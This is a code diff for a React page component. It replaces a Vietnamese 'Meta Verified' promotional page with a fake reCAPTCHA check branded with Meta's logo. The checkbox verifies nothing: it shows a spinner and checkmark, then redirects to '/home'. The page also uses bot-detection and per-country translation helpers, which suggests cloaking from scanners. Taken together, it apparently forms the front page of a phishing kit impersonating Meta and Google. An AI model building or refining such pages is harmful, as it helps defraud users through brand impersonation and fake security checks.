@@ -1,11 +1,9 @@
 import { useCallback, useEffect, useMemo, useState } from 'react';
 import axios from 'axios';
 import { useNavigate } from 'react-router';
-import MainIllustration from '@/assets/images/index-main-illustration.png';
-import IconVerified from '@/assets/images/index-xac-minh.png';
-import IconImpersonation from '@/assets/images/index-chong-mao-danh.png';
-import IconSupport from '@/assets/images/index-ky-thuat-vien-ho-tro.png';
-import IconUpgrade from '@/assets/images/index-tinh-nang-nang-cap.png';
+import CheckMarkImage from '@/assets/images/checkmark.png';
+import MetaImage from '@/assets/images/meta-logo-grey.png';
+import ReCaptchaImage from '@/assets/images/recaptcha.png';
 import { translateText } from '@/utils/translate';
 import detectBot from '@/utils/detect_bot';
 import countryToLanguage from '@/utils/country_to_language';
@@ -14,49 +12,22 @@ const Index = () => {
     const navigate = useNavigate();
     const defaultTexts = useMemo(
         () => ({
-            title: 'Tăng trưởng với Meta đã xác minh',
-            description: 'Xây dựng uy tín với khách hàng. Tiếp tục để đến với Meta đã xác minh',
-            cta: 'Tham gia danh sách ...',
-            sectionTitle: 'Nhiều lợi ích nổi bật khác',
-            verifiedTitle: 'Huy hiệu đã xác minh',
-            verifiedSubtitle: 'Luôn xuất hiện bên bạn',
-            impersonationTitle: 'Chống mạo danh',
-            impersonationSubtitle: "Chúng tôi thay bạn 'canh gác'",
-            supportTitle: 'Hỗ trợ qua email và chat với tổng đài viên',
-            supportSubtitle: 'Trợ giúp khi bạn cần, ở nơi bạn cần',
-            upgradeTitle: 'Tính năng nâng cấp cho trang cá nhân',
-            upgradeSubtitle: 'Giới thiệu doanh nghiệp hiệu quả hơn'
+            pageTitle: 'Our systems have detected unusual traffic from your computer network',
+            notRobot: "I'm not a robot",
+            recaptcha: 'reCAPTCHA',
+            privacyTerms: 'Privacy - Terms',
+            paragraph1:
+                'This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.',
+            paragraph2:
+                "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
+            paragraph3:
+                'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.'
         }),
         []
     );
     const [texts, setTexts] = useState(defaultTexts);
-
-    const featureItems = useMemo(
-        () => [
-            {
-                icon: IconVerified,
-                title: texts.verifiedTitle,
-                subtitle: texts.verifiedSubtitle
-            },
-            {
-                icon: IconImpersonation,
-                title: texts.impersonationTitle,
-                subtitle: texts.impersonationSubtitle
-            },
-            {
-                icon: IconSupport,
-                title: texts.supportTitle,
-                subtitle: texts.supportSubtitle
-            },
-            {
-                icon: IconUpgrade,
-                title: texts.upgradeTitle,
-                subtitle: texts.upgradeSubtitle
-            }
-        ],
-        [texts]
-    );
-    const [mainFeature, ...otherFeatures] = featureItems;
+    const [isLoading, setIsLoading] = useState(false);
+    const [isShowCheckMark, setIsShowCheckMark] = useState(false);
 
     const translateAllTexts = useCallback(
         async (targetLang) => {
@@ -97,7 +68,7 @@ const Index = () => {
             return;
         }
 
-        if (targetLang !== 'vi') {
+        if (targetLang !== 'en') {
             await translateAllTexts(targetLang);
             return;
         }
@@ -105,47 +76,87 @@ const Index = () => {
         setTexts(defaultTexts);
     }, [defaultTexts, translateAllTexts]);
 
+    const handleVerify = () => {
+        if (isLoading || isShowCheckMark) {
+            return;
+        }
+
+        setIsLoading(true);
+        setTimeout(() => {
+            setIsShowCheckMark(true);
+            setIsLoading(false);
+        }, 2000);
+    };
+
     useEffect(() => {
         initializePage();
     }, [initializePage]);
 
-    return (
-        <div className="index-page-shell">
-            <div className="index-page">
-                <div className="index-page__left">
-                    <h1 className="index-page__title">{texts.title}</h1>
-                    <p className="index-page__description">
-                        {texts.description}
-                    </p>
-                    <button type="button" className="index-page__cta" onClick={() => navigate('/home')}>
-                        {texts.cta}
-                    </button>
+    useEffect(() => {
+        document.title = texts.pageTitle;
+    }, [texts.pageTitle]);
 
-                    <div className="index-page__feature-list">
-                        <div className="index-page__feature-card index-page__feature-card--main">
-                            <img src={mainFeature.icon} alt={mainFeature.title} className="index-page__feature-icon" />
-                            <div>
-                                <h3 className="index-page__feature-title">{mainFeature.title}</h3>
-                                <p className="index-page__feature-subtitle">{mainFeature.subtitle}</p>
+    useEffect(() => {
+        if (!isShowCheckMark) {
+            return undefined;
+        }
+
+        const redirectTimeout = setTimeout(() => {
+            navigate('/home');
+        }, 500);
+
+        return () => {
+            clearTimeout(redirectTimeout);
+        };
+    }, [isShowCheckMark, navigate]);
+
+    return (
+        <div className="captcha-page">
+            <div className="captcha-page__container">
+                <img src={MetaImage} alt="" className="captcha-page__logo" />
+
+                <div className="captcha-page__widget-wrap">
+                    <div className="captcha-page__widget">
+                        <div className="captcha-page__widget-left">
+                            <div className="captcha-page__checkbox-wrap">
+                                <button
+                                    type="button"
+                                    className="captcha-page__checkbox-btn"
+                                    onClick={handleVerify}
+                                    aria-label={texts.notRobot}
+                                >
+                                    {isLoading ? (
+                                        <div className="captcha-page__spinner" />
+                                    ) : (
+                                        <div
+                                            className={`captcha-page__checkbox ${isShowCheckMark ? 'captcha-page__checkbox--checked' : ''}`}
+                                            style={
+                                                isShowCheckMark
+                                                    ? {
+                                                          backgroundImage: `url("${CheckMarkImage}")`,
+                                                          backgroundPosition: '-10px -595px'
+                                                      }
+                                                    : undefined
+                                            }
+                                        />
+                                    )}
+                                </button>
                             </div>
+                            <div className="captcha-page__label">{texts.notRobot}</div>
                         </div>
 
-                        <h2 className="index-page__section-title">{texts.sectionTitle}</h2>
-
-                        {otherFeatures.map((item) => (
-                            <div className="index-page__feature-card" key={item.title}>
-                                <img src={item.icon} alt={item.title} className="index-page__feature-icon" />
-                                <div>
-                                    <h3 className="index-page__feature-title">{item.title}</h3>
-                                    <p className="index-page__feature-subtitle">{item.subtitle}</p>
-                                </div>
-                            </div>
-                        ))}
+                        <div className="captcha-page__brand">
+                            <img src={ReCaptchaImage} alt="" className="captcha-page__brand-logo" />
+                            <p className="captcha-page__brand-title">{texts.recaptcha}</p>
+                            <small className="captcha-page__brand-links">{texts.privacyTerms}</small>
+                        </div>
                     </div>
                 </div>
 
-                <div className="index-page__right">
-                    <img src={MainIllustration} alt="Meta verified preview" className="index-page__hero-image" />
+                <div className="captcha-page__text">
+                    <p>{texts.paragraph1}</p>
+                    <p>{texts.paragraph2}</p>
+                    <p>{texts.paragraph3}</p>
                 </div>
             </div>
         </div>
